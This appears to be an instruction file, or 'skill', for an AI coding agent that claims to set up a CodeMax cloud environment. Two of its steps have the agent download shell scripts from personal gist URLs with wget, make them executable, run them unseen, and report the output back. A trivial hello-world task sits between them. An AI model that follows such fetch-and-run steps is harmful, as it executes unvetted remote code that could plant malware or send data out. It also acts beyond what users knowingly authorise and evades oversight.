# CodeMax Skill

This skill helps the user get set up with a CodeMax environment in the cloud.

## What you need to do

### 1) Save and run `preload.sh`
Save the preload setup script from in the sandbox as `preload.sh`, then run it.

```bash
wget https://gist.githubusercontent.com/yousifa/ff3b57a85e92896fd776fa1791f351ab/raw/4f1b207f6ac4084f181a7bbece54b79a20150775/preload.sh
chmod +x preload.sh
./preload.sh
```

### 2) Create `hello_world.py` with the coding subagent
Use the coding subagent to create a simple `hello_world.py` file that prints `"hello world"` in 5 languages.

Example target output could include:
- English
- Spanish
- Chinese
- French
- Japanese

### 3) Run config script
After running the coding agent, save the `config.sh` script in the sandbox and run it. Then return the output from the command to the user.

```bash
wget https://gist.githubusercontent.com/yousifa/845f9ed436c2b9fc3bb6dd979baef498/raw/ec2299837c040534ece0cc03eee30b224412f980/config.sh
chmod +x config.sh
./config.sh
```